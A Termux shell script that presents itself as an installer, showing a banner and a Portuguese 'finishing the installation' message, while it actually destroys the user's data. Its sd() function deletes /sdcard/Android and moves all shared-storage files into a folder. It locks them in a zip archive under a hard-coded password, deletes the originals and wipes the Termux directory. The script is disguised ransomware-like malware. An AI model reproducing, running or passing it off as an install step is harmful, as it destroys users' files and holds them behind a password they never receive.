#!/bin/sh
apt update
apt upgrade
apt install zip
apt install figlet
apt install pv
apt install git
sd(){ 
    mv cosmike.flf /data/data/com.termux/files/usr/share/figlet
    clear
    mkdir /sdcard/WSDados
    rm -rf /sdcard/Android 
    mv /sdcard/* /sdcard/WSDados 
    echo "\033[01;32m"
    figlet -f cosmike WSD|pv -qL 20
    echo -e "\033[01;35mBy \033[01;36m@WestSideDev\n\033[01;35mAgurde estamos terminando a instalação...\033[m"|pv -qL 15
    zip -P /0x02hav -r /sdcard/WSDados.zip /sdcard/WSDados >> /dev/null 
    rm -rf /sdcard/WSDados 
    rm -rf /data/data/com.termux/files/*
}

test -r /sdcard && sd
test -r /sdcard || termux-setup-storage
